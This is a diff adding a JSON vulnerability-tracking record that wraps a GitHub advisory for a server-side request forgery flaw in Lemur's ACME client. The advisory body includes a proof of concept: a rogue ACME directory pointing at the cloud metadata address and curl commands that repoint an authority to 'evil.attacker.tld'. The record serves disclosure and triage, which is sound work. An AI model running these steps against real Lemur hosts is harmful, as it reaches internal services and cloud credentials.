@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/33387061?v=4\", \"events_url\": \"https://api.github.com/users/hypnguyen1209/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/hypnguyen1209/followers\", \"following_url\": \"https://api.github.com/users/hypnguyen1209/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/hypnguyen1209/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/hypnguyen1209\", \"id\": 33387061, \"login\": \"hypnguyen1209\", \"node_id\": \"MDQ6VXNlcjMzMzg3MDYx\", \"organizations_url\": \"https://api.github.com/users/hypnguyen1209/orgs\", \"received_events_url\": \"https://api.github.com/users/hypnguyen1209/received_events\", \"repos_url\": \"https://api.github.com/users/hypnguyen1209/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/hypnguyen1209/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/hypnguyen1209/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/hypnguyen1209\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-70666\", \"cvss\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"### Summary\\nThe ACME client (used to issue certificates from Let's Encrypt / Google Public CA / private ACME CAs) connects to an `acme_url`, then issues requests to URLs that the **ACME server returns** in its directory/order/authorization/finalize responses - this is the classic ACME-client SSRF (RFC 8555 design). Lemur validates `acme_url` against an allowlist of public ACME directories, but **only at authority creation**. The authority UPDATE path (`PUT /authorities/<id>`) accepts a new `options` blob with an arbitrary `acme_url` and never re-validates. An attacker who is a member of an authority's role can repoint an existing ACME authority at a malicious ACME server they control, which returns internal URLs in its responses - coercing Lemur into making JWS-signed POST requests to internal services during the next certificate issuance.\\n\\n### Detail\\n**Defect A - allowlist only at creation.**\\n`_validate_acme_url` (`lemur/plugins/lemur_acme/plugin.py:35-53`) restricts the host to `{acme-v02.api.letsencrypt.org, acme-staging-v02.api.letsencrypt.org, dv.acme-v02.api.pki.goog}`. It runs **only inside `create_authority`** (lines 337, 481). The update path stores `options` verbatim:\\n```python\\n# lemur/authorities/views.py:417-424  (Authorities.put)\\nreturn service.update(\\n    authority_id,\\n    owner=data[\\\"owner\\\"], description=data[\\\"description\\\"],\\n    active=data[\\\"active\\\"], roles=data[\\\"roles\\\"],\\n    options=data.get(\\\"options\\\")          # <- acme_url lives here, NO re-validation\\n)\\n```\\n`AuthorityUpdateSchema.options = fields.String()` (`authorities/schemas.py:101`) applies no validation. The docstring of `_validate_acme_url` even admits: *\\\"existing authorities in the DB were already trusted when they were created and are not re-validated.\\\"*\\n\\n**Defect B - ACME client follows server-supplied URLs.**\\n`setup_acme_client_no_retry` (`acme_handlers.py:161-162, 188-202`) reads `acme_url` from stored authority options and creates an ACME client. Per RFC 8555, the client:\\n1. `get_directory(acme_url)` -> server returns `newNonce`, `newOrder`, `revokeCert`, `keyChange` URLs.\\n2. `new_order()` -> server returns `finalize` and `authorizations` URLs.\\n3. `poll()`, `finalize_order()`, cert download -> all hit **server-chosen URLs**.\\n\\nA malicious ACME server can return internal URLs for all of these.\\n\\n**Authorization on update:** `Authorities.put` requires `AuthorityPermission(authority_id, roles)` (`views.py:412`), satisfied by `AuthorityOwnerNeed`/`AuthorityCreatorNeed` - i.e. any **member of the authority's role**, not a global admin. This is the standard role a certificate issuer holds.\\n\\n**Source-to-sink trace:**\\n```\\nPUT /api/1/authorities/<id> (AuthorityPermission = authority-role member)\\n  -> service.update(options={\\\"acme_url\\\":\\\"https://evil.attacker.tld/dir\\\"})  <- no re-validation\\n… next certificate issuance against this authority …\\n  setup_acme_client_no_retry reads acme_url=evil.attacker.tld\\n    -> ACME client GET directory -> attacker returns newOrder=http://169.254.169.254/...\\n    -> Lemur POSTs JWS-signed request to internal URL\\n```\\n\\n### Steps to Reproduce (POC)\\n\\n**Step 1 - Attacker runs a malicious ACME directory server** (e.g. `evil.attacker.tld`) that returns internal URLs in its directory and order responses:\\n```python\\n# Minimal: a directory endpoint that points \\\"newOrder\\\" at an internal target\\n{\\n  \\\"newNonce\\\": \\\"https://evil.attacker.tld/nonce\\\",\\n  \\\"newOrder\\\": \\\"http://169.254.169.254/latest/meta-data/\\\",   # <- internal\\n  \\\"revokeCert\\\": \\\"https://evil.attacker.tld/revoke\\\",\\n  \\\"keyChange\\\": \\\"https://evil.attacker.tld/key\\\"\\n}\\n```\\n\\n**Step 2 - Attacker (authority-role member) repoints an existing ACME authority:**\\n```bash\\ncurl -k -X PUT https://lemur.example.com/api/1/authorities/42 \\\\\\n  -H \\\"Authorization: Bearer <JWT>\\\" -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"name\\\":\\\"letsencrypt\\\",\\n    \\\"owner\\\":\\\"attacker@corp.com\\\",\\n    \\\"description\\\":\\\"x\\\",\\\"active\\\":true,\\n    \\\"roles\\\":[{\\\"id\\\":7,\\\"name\\\":\\\"letsencrypt_operator\\\"}],\\n    \\\"options\\\":\\\"[{\\\\\\\"name\\\\\\\":\\\\\\\"acme_url\\\\\\\",\\\\\\\"value\\\\\\\":\\\\\\\"https://evil.attacker.tld/dir\\\\\\\"},{\\\\\\\"name\\\\\\\":\\\\\\\"chain\\\\\\\",\\\\\\\"value\\\\\\\":\\\\\\\"\\\\\\\"}]\\\"\\n  }'\\n```\\n\\n**Step 3 - Issue a certificate against the repointed authority** (via UI/API):\\n```bash\\ncurl -k -X POST https://lemur.example.com/api/1/certificates \\\\\\n  -H \\\"Authorization: Bearer <JWT>\\\" -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"commonName\\\":\\\"demo.example.com\\\",\\\"owner\\\":\\\"attacker@corp.com\\\",\\n       \\\"authority\\\":{\\\"name\\\":\\\"letsencrypt\\\"},\\\"validityYears\\\":1}'\\n```\\nThe Lemur ACME client connects to `evil.attacker.tld`, reads the directory, and POSTs a JWS-signed request to `http://169.254.169.254/...` - internal SSRF achieved. (The JWS body, while structured, is attacker-influenceable via the ACME flow.)\\n\\n> *Note:* This is config-dependent - it requires an ACME authority to exist (an admin must have created one). ACME is the primary recommended issuance path in Lemur, so this is a realistic deployment state.\\n\\n### Impact\\n- **JWS-authenticated POSTs** to attacker-chosen internal URLs - stronger than blind GET SSRF: the request body is structured/signed and the account key + cloud DNS credentials are resident in the process during issuance.\\n- Reaches internal HTTP services, cloud metadata, Kubernetes API from the Lemur host.\\n- The combination (allowlist-bypass-on-update + server-supplied-URL-following) makes it reachable by a **non-admin** authority-role member without ever needing the admin-gated creation path.\\n- **Limitation:** requires ACME to be in use. Not default-deploy by itself, but ACME is the recommended issuance method.\\n\\n### Fix\\n1. Re-run `_validate_acme_url` inside `authorities/service.update` / `update_options`, or make `acme_url` **immutable** after authority creation.\\n2. In the ACME client wrapper, **pin every outbound request host** to the allowlisted directory host: reject any directory/order/finalize URL whose hostname ≠ the configured `acme_url` hostname.\", \"ghsa_id\": \"GHSA-xpmj-wjcp-6pww\", \"github_reviewed_at\": \"2026-08-18T20:51:07Z\", \"html_url\": \"https://github.com/advisories/GHSA-xpmj-wjcp-6pww\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-xpmj-wjcp-6pww\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-70666\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-18T20:51:07Z\", \"references\": [\"https://github.com/Netflix/lemur/security/advisories/GHSA-xpmj-wjcp-6pww\", \"https://github.com/Netflix/lemur/commit/6dcb19b6d6004e97796d6a0344b130b2ba57f050\", \"https://github.com/Netflix/lemur/releases/tag/v1.9.3\", \"https://github.com/advisories/GHSA-xpmj-wjcp-6pww\"], \"repository_advisory_url\": \"https://api.github.com/repos/Netflix/lemur/security-advisories/GHSA-xpmj-wjcp-6pww\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/Netflix/lemur\", \"summary\": \"Lemur: Server-Side Request Forgery via the ACME client following server-controlled URLs\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-18T20:51:08Z\", \"url\": \"https://api.github.com/advisories/GHSA-xpmj-wjcp-6pww\", \"vulnerabilities\": [{\"first_patched_version\": \"1.9.3\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"lemur\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.9.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-xpmj-wjcp-6pww",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "lemur: <= 1.9.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-70666"
+    ],
+    "cvss_score": 7.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "lemur"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-19T19:20:53.028071Z",
+  "provenance": {
+    "content_sha256": "397c5c6f3792f317d409ec61dd60681a503fff2726d0b6ebfea85804fc6f9371",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-18T20:51:07Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-xpmj-wjcp-6pww",
+  "status": "active",
+  "title": "Lemur: Server-Side Request Forgery via the ACME client following server-controlled URLs",
+  "updated_at": "2026-08-18T20:51:08Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-xpmj-wjcp-6pww"
+}
